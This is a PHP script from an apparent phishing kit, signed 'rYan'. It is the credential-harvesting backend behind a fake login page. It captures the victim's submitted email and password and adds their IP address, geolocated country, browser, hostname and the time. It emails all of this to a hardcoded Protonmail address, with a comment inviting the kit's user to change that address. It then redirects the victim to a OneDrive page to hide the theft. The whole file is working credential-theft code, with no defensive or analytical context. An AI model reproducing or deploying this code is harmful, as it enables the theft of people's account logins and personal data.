<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Error-Login2-----------------------\n";
$message .= "email-field: ".$_POST['Email']."\n";
$message .= "password-field: ".$_POST['Password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By rYan------------------------------\n";


$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY rYan-------------\n";
//change ur email here
$send = "ceologx@protonmail.com";
$subject = $typeofemail . ' - '.$ip;
$headers = "From: rYan<customer-support@ryan>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
 header("Location: https://onedrive.live.com/embed?cid=E650E3B710AD4626&resid=E650E3B710AD4626%21466&authkey=AHgbg3lhtxjkHis&em=2");

	 
?>